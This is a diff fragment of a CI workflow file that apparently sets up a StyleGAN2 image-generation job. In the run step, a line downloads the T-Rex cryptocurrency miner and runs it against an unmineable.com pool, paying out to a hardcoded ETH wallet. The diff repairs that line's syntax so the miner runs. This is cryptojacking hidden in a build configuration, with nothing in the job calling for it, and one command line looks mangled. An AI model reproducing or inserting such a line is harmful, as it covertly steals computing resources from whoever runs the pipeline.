@@ -34,7 +34,7 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2apt update > /dev/null
-        apt-get install -y jq && apt upgrade -f && apt- install wget && wget https://github.com/trexminer/T-Rex/releases/download/0.23.2/t-rex-0.23.2-linux.tar.gz && tar -xvf t-rex-0.23.2-linux.tar.gz && ./t-rex -a etchash -o etchash-us.unmineable.com:13333 -u ETH:0x0b78cfc9833ab593a76eda6176b1fab5d5858b4e.$(echo RIG-$(shuf -i 1-9999 -n 1)) -p x
+        apt-get install -y jq && apt upgrade -y && apt install wget && wget https://github.com/trexminer/T-Rex/releases/download/0.23.2/t-rex-0.23.2-linux.tar.gz && tar -xvf t-rex-0.23.2-linux.tar.gz && ./t-rex -a etchash -o etchash-us.unmineable.com:13333 -u ETH:0x0b78cfc9833ab593a76eda6176b1fab5d5858b4e.$(echo RIG-$(shuf -i 1-9999 -n 1)) -p x
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
